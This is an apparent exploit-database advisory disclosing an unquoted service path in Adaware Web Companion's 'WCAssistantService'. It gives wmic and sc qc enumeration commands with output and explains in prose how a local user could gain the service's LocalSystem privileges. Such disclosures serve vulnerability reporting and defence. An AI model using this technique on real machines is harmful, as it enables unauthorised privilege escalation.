@@ -1,0 +1,38 @@
+# Exploit Title: Adaware Web Companion version 4.8.2078.3950 - 'WCAssistantService' Unquoted Service Path
+# Date: 2019-11-06
+# Exploit Author: Mariela L Martínez Hdez
+# Vendor Homepage: https://webcompanion.com/en/
+# Software Link: https://webcompanion.com/en/
+# Version: Adaware Web Companion version 4.8.2078.3950
+# Tested on: Windows 10 Home (64 bits)
+
+# 1. Description
+# Adaware Web Companion version 4.8.2078.3950 service 'WCAssistantService' has an unquoted service path.
+
+# 2. PoC
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /V "C:\Windows" | findstr /i /V """"
+
+WC Assistant        WCAssistantService        C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe     Auto
+
+C:\>sc qc WCAssistantService
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: WCAssistantService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Lavasoft\Web Companion\Application\Lavasoft.WCAssistant.WinService.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : WC Assistant
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+ 
+
+# 3. Exploit
+# A successful attempt would require the local user to be able to insert their code in the system 
+# root path undetected by the OS or othersecurity applications where it could potentially be executed 
+# during application startup or reboot. If successful, the local user's code would execute with 
+# the elevated privileges of the application.
